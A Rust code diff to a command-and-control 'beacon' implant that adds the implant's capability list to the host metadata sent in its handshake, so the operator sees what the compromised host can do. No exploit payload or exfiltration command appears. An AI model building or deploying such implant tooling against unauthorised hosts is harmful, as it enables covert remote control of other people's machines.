@@ -16,6 +16,20 @@ pub const MAX_TASKS_PER_CYCLE: usize = 64;
 // to four TASK_CANCEL frames (hub.MaxPendingCancels on the server).
 const MAX_REKEY_ROUNDS: usize = 8;
 
+/// The HELLO metadata: the host facts plus what this implant can do.
+///
+/// The capability list travels with the handshake, so the server never
+/// queues a task the beacon cannot run and the operator sees the host's
+/// reach before the first command.
+fn hello_meta() -> Value {
+    let mut meta = sysinfo::meta(VERSION);
+    if let Value::Map(ref mut fields) = meta {
+        let caps: Vec<Value> = task::capabilities().into_iter().map(upk::s).collect();
+        fields.insert("caps".to_string(), upk::arr(caps));
+    }
+    meta
+}
+
 pub struct Beacon {
     pub cfg: Config,
     session: Option<Session>,
@@ -260,7 +274,7 @@ impl Beacon {
     fn handshake(&mut self) -> Result<(), String> {
         let suites = crypto::supported_suites();
         let suite = *suites.first().ok_or("no AEAD suite compiled in")?;
-        let meta = sysinfo::meta(VERSION);
+        let meta = hello_meta();
         let handshake = {
             let channel = self.channel.as_mut().ok_or("the channel is closed")?;
             crate::link::client_handshake(
